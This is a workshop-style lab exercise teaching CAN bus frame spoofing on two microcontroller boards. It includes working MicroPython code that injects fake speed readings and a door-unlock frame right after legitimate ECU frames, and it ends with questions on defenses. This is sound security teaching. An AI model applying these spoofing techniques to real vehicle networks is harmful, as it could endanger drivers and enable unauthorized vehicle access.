# Challenge 3: Frame Spoofing Attack
**Difficulty:** 🟡 Medium | **Time:** 30 min | **Boards:** 2

## 🎯 Objective
Use the CANHack toolkit to **spoof CAN frames** — inject a fake frame immediately after a legitimate frame, before the real ECU can respond. This is a real-world attack vector.

## 📖 Background
A spoof attack works by:
1. Listening for a specific target frame on the bus
2. Immediately after the target frame ends, injecting a fake frame
3. The fake frame arrives before the next legitimate frame, so receivers accept it

The CANHack toolkit's `spoof_frame()` function automates this at the bit level — it's faster than any software-based approach.

## 🔬 Exercise

### Setup
- **Board A (Attacker):** Will spoof frames using CANHack
- **Board B (Victim ECU):** Sends periodic "legitimate" frames
- Both connected on the same CAN bus

### Part A: Set up the victim ECU
**Board B — simulates an ECU sending periodic speed data:**
```python
from rp2 import CAN, CANFrame, CANID
from utime import sleep_ms
from struct import pack

c = CAN()
speed = 60  # km/h

while True:
    f = CANFrame(CANID(0x244), data=pack('>H', speed * 100))
    try:
        c.send_frame(f)
    except:
        pass
    sleep_ms(100)  # 10 Hz update rate
```

### Part B: Monitor the bus (on Board A first)
**Board A — verify you can see the victim's frames:**
```python
from rp2 import CAN, CANFrame, CANID
c = CAN()

while True:
    frames = c.recv()
    for frame in frames:
        print(frame)
```

You should see ID 0x244 arriving every ~100ms.

### Part C: Spoof attack — inject a fake frame after the target
**Board A — configure CANHack for spoofing:**
```python
from rp2 import CAN, CANFrame, CANID, CANHack
from struct import pack

# Initialize CAN in tx_open_drain mode (required for CANHack)
c = CAN(tx_open_drain=True)
ch = CANHack()

# Define the TARGET frame to watch for (victim's speed frame)
target_id = 0x244

# Define the SPOOF frame to inject (fake speed = 200 km/h)
fake_speed = 200
spoof_data = pack('>H', fake_speed * 100)

# Set up the spoof
ch.set_frame(can_id=target_id, data=spoof_data)

# Set the attack mask — watch for ID 0x244
ch.set_attack(can_id=target_id)

# Execute the spoof: wait for target frame, then inject immediately after
print("Waiting for target frame...")
result = ch.spoof_frame(timeout=500000)
print(f"Spoof result: {result}")
```

### Part D: Continuous spoofing
```python
from rp2 import CAN, CANFrame, CANID, CANHack
from struct import pack

c = CAN(tx_open_drain=True)
ch = CANHack()

fake_speed = 250  # Dangerously high!
spoof_data = pack('>H', fake_speed * 100)

ch.set_frame(can_id=0x244, data=spoof_data)
ch.set_attack(can_id=0x244)

count = 0
while count < 50:  # Spoof 50 frames
    result = ch.spoof_frame(timeout=500000)
    if result:
        count += 1
        print(f"Spoofed frame #{count}")

print(f"Done — spoofed {count} frames")
```

### Part E: Spoof a different signal
Instead of speed, spoof the door lock signal:
```python
# Spoof door unlock (ID 0x19B)
ch.set_frame(can_id=0x19B, data=bytes([0x00, 0x00, 0x00, 0x00]))
ch.set_attack(can_id=0x19B)
ch.spoof_frame(timeout=500000)
```

**Questions:**
1. How fast does the spoof frame appear after the target frame?
2. Could a receiver distinguish the spoofed frame from the real one?
3. What defenses would prevent this attack?
4. How does this differ from simply sending a frame with `send_frame()`?

## 📝 What to Share
- Demo of the spoof attack working
- Timing analysis: how quickly does the spoof follow the target?
- Discussion: why is bit-level spoofing more dangerous than application-level injection?

## 🏆 Stretch
- [ ] Spoof with a Janus frame (see Challenge 7)
- [ ] Measure the exact time gap between the target frame and your spoof
- [ ] Can you spoof a frame that arrives BEFORE the legitimate one? (hint: priority)
